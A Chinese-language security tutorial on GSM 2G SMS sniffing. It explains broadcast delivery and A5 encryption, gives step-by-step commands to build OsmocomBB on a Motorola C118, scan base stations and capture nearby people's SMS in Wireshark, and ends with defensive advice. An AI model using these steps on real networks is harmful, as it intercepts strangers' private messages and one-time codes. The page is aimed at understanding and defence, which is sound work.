---
slug: /sms-sniffing
title: 短信嗅探
icon: telephone-icon
sidebar_position: 26
---

## 1 背景知识

**2G 短信在设计上存在根本性的安全缺陷，基站以广播方式发送短信，仅依靠终端侧的逻辑过滤来保证私密性，绕过这层过滤即可嗅探附近所有人的短信。** 实现这一攻击的硬件门槛极低，一台老式手机配合开源软件即可完成。

<!-- truncate -->

## 1.1 短信工作原理

**GSM 短信的广播传输机制是嗅探攻击的根源——基站向覆盖范围内所有终端广播短信，由终端自行过滤非本机号码的内容，攻击者只需绕过终端的过滤逻辑即可截获所有短信。**

![GSM工作流程](./sms_sniffer_gsm.gif)

*GSM通信流程*

2G短信的传播方式有点类似Wi-Fi，基站对应的是路由器，而我们手机对应的是电脑。 当我们手机开机时，会主动搜索附近的基站信息，并根据SIM卡选择对应的运营商基站。连上基站获取到信号后，当有短信或者电话过来时，基站是通过广播的方式发给附近的所有人，但我们手机会有一道验证过程，这个过程会保证我们只能收到自己手机号的短信和电话。 如果我们绕过这道逻辑，便可以监控经过这个基站的所有短信和电话了。那我们如何绕过手机的这道验证呢，已经有一套成熟的开源解决方案了。

## 1.2 GSM加密算法

**GSM 的 A5 加密算法本身存在已知弱点，且实际网络中加密强度参差不齐，这为嗅探后的解密提供了可能。** GSM加密采用A5算法，A5算法1989年由法国人开发，是一种序列密码，它是欧洲GSM标准中规定的加密算法，专用于数字蜂窝移动电话的加密，用于对从电话到基站连接的加密。A5的特点是效率高，适合硬件上高效实现。A5发展至今有多个版本，目前GSM终端一般支持A5/1和A5/3，值得注意的是A5/2是被故意弱化强度的版本，2006年后被强制叫停。

## 1.3 名词解释

- MS：Mobile Station，移动终端
- IMSI：International Mobile Subscriber Identity，国际移动用户标识号，是TD系统分给用户的唯一标识号，它存储在SIM卡、HLR/VLR中，最多由15个数字组成
- MCC：Mobile Country Code，是移动用户的国家号，中国是460
- MNC：Mobile Network Code ，是移动用户的所属PLMN网号，中国移动为00、02，中国联通为01
- MSIN：Mobile Subscriber Identification Number，是移动用户标识
- NMSI：National Mobile Subscriber Identification，是在某一国家内MS唯一的识别码
- BTS：Base Transceiver Station，基站收发器
- BSC：Base Station Controller，基站控制器
- MSC：Mobile Switching Center，移动交换中心。移动网络完成呼叫连接、过区切换控制、无线信道管理等功能的设备，同时也是移动网与公用电话交换网(PSTN)、综合业务数字网(ISDN)等固定网的接口设备
- HLR：Home location register。保存用户的基本信息，如你的SIM的卡号、手机号码、签约信息等，和动态信息，如当前的位置、是否已经关机等
- VLR：Visiting location register，保存的是用户的动态信息和状态信息，以及从HLR下载的用户的签约信息
- CCCH：Common Control CHannel，公共控制信道。是一种“一点对多点”的双向控制信道，其用途是在呼叫接续阶段，传输链路连接所需要的控制信令与信息

## 1.4 运行过程

- MS（手机）向系统请求分配信令信道（SDCCH）
- MSC收到手机发来的IMSI可及消息
- MSC将IMSI可及信息再发送给VLR，VLR将IMSI不可及标记更新为IMSI可及
- VLR反馈MSC可及信息信号
- MSC再将反馈信号发给手机
- MS倾向信号强的BTS，使用哪种算法由基站决定，这也导致了可以用伪基站进行攻击

## 2 着手实践

**以下内容记录了利用开源工具复现短信嗅探的完整过程，目的是理解攻击原理，从而针对性地评估防御措施的有效性。**

## 2.1 准备工作

![短信嗅探手机](./sms_sniffer_phone2-765x1024.webp)

*购买的测试设备：摩托罗拉C118*

- [OsmocomBB](http://bb.osmocom.org/trac/wiki/Hardware/Phones)– OsmocomBB(Open source mobile communication Baseband)是GSM协议栈(Protocols stack)的开源实现。
- 手机 – 我们这次选用国内最容易买到的摩托罗拉C118手机
- 耳机线
- USB2TTL线
- 电脑 – 各Linux版本都可以，这次我们选择Backtrack5

## 2.2 运行环境

建议在BackTrack或Kali系统下操作

```bash
# 安装依赖
sudo apt-get install libtool shtool autoconf git-core pkg-config make gcc build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev  

# 下载源码
git clone git://git.osmocom.org/osmocom-bb.git  
git clone git://git.osmocom.org/libosmocore.git

# 编译libosmocore
cd ~/libosmocore  
autoreconf -i  
./configure  
make  
sudo make install

# 编译osmocom-bb
cd ~/osmocom-bb
git checkout --track origin/luca/gsmmap  
cd src  
make
```

## 2.3 短信嗅探

![](./sms_sniffer_parts-1024x768.webp)

*将 USB2TTL 接到电脑，把耳机线一头接到手机，另外一头接到 USB2TTL 上。*

```bash
# 查看手机连接状态
lsmod | grep usb

cd ~/osmocom-bb/src/host/osmocon/  
./osmocon -m c123xor -p /dev/ttyUSB0 ../../target/firmware/board/compal_e88/layer1.compalram.bin

# 再开一个终端查看可用基站
cd ~/osmocom-bb/src/host/layer23/src/misc/  
./cell_log

# 嗅探指定基站
cd ~/osmocom-bb/src/host/layer23/src/misc/  
./ccch_scan -i 127.0.0.1 -a 117

# 再开一个终端窗口查看嗅探结果
sudo wireshark -k -i lo -f 'port 4729'
```

![嗅探测试结果](./sms_sniffer_result-1024x765.webp)

*过滤只显示gsm_sms即可看到附近的短信嗅探结果*

**单台设备只能捕获当前信道的部分短信，若要覆盖一个完整基站需要多台设备并行监听各信道。** 这也意味着防御短信嗅探的有效手段是推动业务从 2G 短信验证码迁移到更安全的认证方式，而运营商侧则应尽快完成网络升级、关闭 2G 降级通道。

**从防御角度来看，GSM 频段还存在伪基站风险——攻击者可架设信号更强的基站诱使周边手机接入，从而主动干预短信收发。** 识别和防范伪基站是运营商网络安全的重要议题，用户侧可通过关注异常信号强度和突然降级到 2G 的提示来提高警惕。

**参考**

- [OSMOCOMBB新手指南](http://wulujia.com/2013/11/10/OsmocomBB-Guide/)
- [OsmocomBB](http://bb.osmocom.org/trac/wiki/Hardware/Phones)
- [GSM](http://www.tutorialspoint.com/gsm/gsm_architecture.htm)
